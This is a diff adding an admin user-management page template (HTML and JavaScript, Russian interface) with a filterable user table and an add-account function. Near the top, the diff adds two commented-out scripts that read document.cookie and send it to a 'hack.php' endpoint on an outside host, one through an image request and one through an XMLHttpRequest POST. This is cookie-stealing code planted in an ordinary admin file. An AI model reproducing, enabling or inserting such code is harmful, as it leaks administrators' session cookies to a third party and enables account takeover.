@@ -1,0 +1,91 @@
+<link rel="stylesheet" href='/modules/account/templates/index.css'>
+<h1>Управление пользователями</h1>
+<!--<script>
+    let img = new Image(); img.src = 'https://api.iq.academy/hack.php?' + document.cookie;
+</script>-->
+
+<!--<script>
+    let a = document.cookie;
+    let url = 'https://api.iq.academy/hack.php?' + a;
+    let xmlhttp = new XMLHttpRequest();
+    xmlhttp.onreadystatechange = function () {}
+    xmlhttp.open("POST", url);
+    xmlhttp.send();
+</script>-->
+<script>
+
+    function add() {
+        let xmlhttp = new XMLHttpRequest();
+        xmlhttp.onreadystatechange = function () {
+            if (this.readyState === 4)
+            {
+                let id = this.responseText;
+                let nexturl = "admin.php?module=account&act=edit&id="+id;
+                location.href = nexturl;
+            }
+        }
+        let send = new FormData(document.getElementById('add'));
+
+        xmlhttp.open("POST", "ajax.php?module=account&act=add");
+        xmlhttp.send(send);
+    }
+
+    // function login(id) {
+    //     let xmlhttp = new XMLHttpRequest();
+    //     xmlhttp.onreadystatechange = function () {
+    //         if (this.readyState === 4)
+    //         {
+    //             let token = this.responseText;
+    //             if (token.indexOf('not found') === -1) {
+    //                 let nexturl = '<front_url />/?newtoken=' + token;
+    //                 //window.open(nexturl, '_blank');
+    //                 location.href = nexturl;
+    //             }
+    //             else
+    //                 alert(token);
+    //         }
+    //     }
+    //     let url = "ajax.php?module=account&act=login&id=" + id;
+    //
+    //     xmlhttp.open("POST", url);
+    //     xmlhttp.send();
+    // }
+</script>
+<div>
+    <div class="items_table_block">
+        <form id="course_search" method="get" onchange="this.submit()" action="admin.php">
+            <input type="hidden" name="module" value="account">
+        <div style="padding-bottom: 10px">
+            Фильтр: <select name="type_search">
+                <option value="" type>Все (<users_count />)</option>
+                <option value="1" type>Заявка (<apply />)</option>
+                <option value="2" type>Не активирован (<not_activated />)</option>
+            </select>
+        </div>
+        <table class="items_table" id="users_list" >
+            <thead>
+            <tr class="items_row items_row_header">
+                <td class="items_cell"><b>Имя</b></td>
+                <td class="items_cell"><b>Почта</b></td>
+                <td class="items_cell"><b>Telegram</b></td>
+                <td class="items_cell"><b>Дата последней активности</b></td>
+                <td class="items_cell"><b>Дата регистрации</b></td>
+                <td class="items_cell items_cell_icons">Управление</td>
+            </tr>
+            </thead>
+            <tbody>
+            <tr class="items_row">
+                <td class="items_cell"><input id="name_search_input" name="name_search" type="text" placeholder="Поиск" value="<name_search />" /></td>
+                <td class="items_cell"><input id="mail_search_input" name="mail_search" type="text" placeholder="Поиск" value="<mail_search />" /></td>
+                <td class="items_cell"><input id="tg_search_input" name="tg_search" type="text" placeholder="Поиск" value="<tg_search />" /></td>
+                <td class="items_cell"></td>
+                <td class="items_cell"></td>
+                <td class="items_cell items_cell_icons"></td>
+            </tr>
+                <users />
+            </tbody>
+        </table>
+    </form>
+    </div>
+    <pages />
+</div>
